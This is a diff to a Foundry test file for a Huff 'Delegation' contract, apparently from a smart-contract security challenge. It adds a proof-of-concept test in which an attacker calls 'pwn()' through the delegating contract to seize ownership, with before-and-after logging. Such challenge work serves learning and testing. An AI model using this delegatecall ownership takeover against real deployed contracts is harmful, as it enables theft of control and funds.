@@ -12,10 +12,12 @@ import {IDelegation} from "src/interfaces/IDelegation.sol";
 
 contract Delegate is Test {
     address OWNER = makeAddr("Owner");
-    address ATTACLER = makeAddr("Attacker");
+    address ATTACKER = makeAddr("Attacker");
 
     IDelegate delegateInterface;
     IDelegation delegationInterface;
+
+    error CallFailed();
 
     function setUp() public {
         vm.startPrank(OWNER);
@@ -28,7 +30,9 @@ contract Delegate is Test {
 
         address delegationAddress = HuffDeployer
             .config()
-            .with_args(bytes.concat(abi.encode(delegateAddress), abi.encode(OWNER)))
+            .with_args(
+                bytes.concat(abi.encode(OWNER), abi.encode(delegateAddress))
+            )
             .deploy("Delegation");
         delegationInterface = IDelegation(delegationAddress);
 
@@ -40,7 +44,36 @@ contract Delegate is Test {
         assertEq(delegationInterface.owner(), OWNER);
     }
 
-    function test_delegate() public {
-        assertEq(delegationInterface.delegate(), address(delegateInterface));
+    function test_pwn() public {
+        vm.prank(ATTACKER);
+        delegateInterface.pwn();
+
+        assertEq(delegateInterface.owner(), ATTACKER);
+    }
+
+    function test_PoC() public {
+        console.log(
+            "DELEGATE'S OWNER (BEFORE ATTACK): ",
+            delegateInterface.owner()
+        );
+        console.log(
+            "DELEGATION'S OWNER (BEFORE ATTACK): ",
+            delegationInterface.owner()
+        );
+
+        vm.prank(ATTACKER);
+        (bool success, ) = address(delegationInterface).call(
+            abi.encodeWithSignature("pwn()")
+        );
+        if (!success) revert CallFailed();
+
+        console.log(
+            "DELEGATE'S OWNER (AFTER ATTACK): ",
+            delegateInterface.owner()
+        );
+        console.log(
+            "DELEGATION'S OWNER (AFTER ATTACK): ",
+            delegationInterface.owner()
+        );
     }
 }
